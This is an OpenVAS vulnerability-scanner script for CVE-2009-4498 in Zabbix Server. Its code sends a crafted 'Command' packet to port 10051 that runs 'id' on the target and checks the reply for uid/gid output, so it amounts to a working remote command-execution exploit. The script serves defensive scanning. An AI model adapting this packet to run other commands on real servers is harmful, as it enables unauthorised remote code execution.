###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_zabbix_serv_arbitrary_cmd_exec_vuln.nasl 5401 2017-02-23 09:46:07Z teissa $
#
# Zabbix Arbitrary Command Execution Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to execute arbitrary commands
  via specially crafted data.

  Impact level: Application";

tag_affected = "Zabbix Server versions prior to 1.8";
tag_insight = "This issue is due to an error in the 'node_process_command()'
  function, which can be exploited to execute arbitrary commands via
  specially crafted data.";
tag_solution = "Update to version 1.8 or above,
  http://www.zabbix.com/download.php";
tag_summary = "This host is installed with Zabbix Server and is prone to arbitrary command
  execution vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.900226";
CPE = "cpe:/a:zabbix:zabbix";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 5401 $");
  script_tag(name:"last_modification", value:"$Date: 2017-02-23 10:46:07 +0100 (Thu, 23 Feb 2017) $");
  script_tag(name:"creation_date", value:"2010-01-28 16:24:05 +0100 (Thu, 28 Jan 2010)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-4498");
  script_name("Zabbix Arbitrary Command Execution Vulnerability");


  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("zabbix_detect.nasl","zabbix_web_detect.nasl");
  script_require_ports("Services/www","Services/zabbix_server", 80,10051);
  script_require_keys("Zabbix/installed");
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "impact" , value : tag_impact);
  script_xref(name : "URL" , value : "http://secunia.com/advisories/37740/3/");
  script_xref(name : "URL" , value : "https://support.zabbix.com/browse/ZBX-1030");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2009/3514");
  exit(0);
}

include("misc_func.inc");

port = get_kb_item("Services/zabbix_server");
if(!port)port = 10051;

if(!get_port_state(port))exit(0);

function _req(node, cmd) {

  soc = open_sock_tcp(port);
  if(!soc)exit(0);

  host_id = rand_str(length:3, charset:"1234567890");

  req = 'Command' + raw_string(0xad) + node + raw_string(0xad) + host_id + raw_string(0xad) + cmd + raw_string(0x0a);
  send(socket:soc,data:req);

  recv = recv(socket:soc, length:1024);
  close(soc);

  return recv;

}

node = '0';
cmd = 'id';

recv = _req(node:node, cmd:cmd);

if("-1" >< recv && "NODE" >< recv) {


  n = eregmatch(pattern:"NODE ([0-9])+", string: recv);
  if(isnull(n[1]))exit(0);

  node = string(n[1]);

  recv = _req(node:node, cmd:cmd);

}

if(recv =~ "uid=[0-9]+.*gid=[0-9]+.*") {
  security_message(port:port);
  exit(0);
}

exit(0);
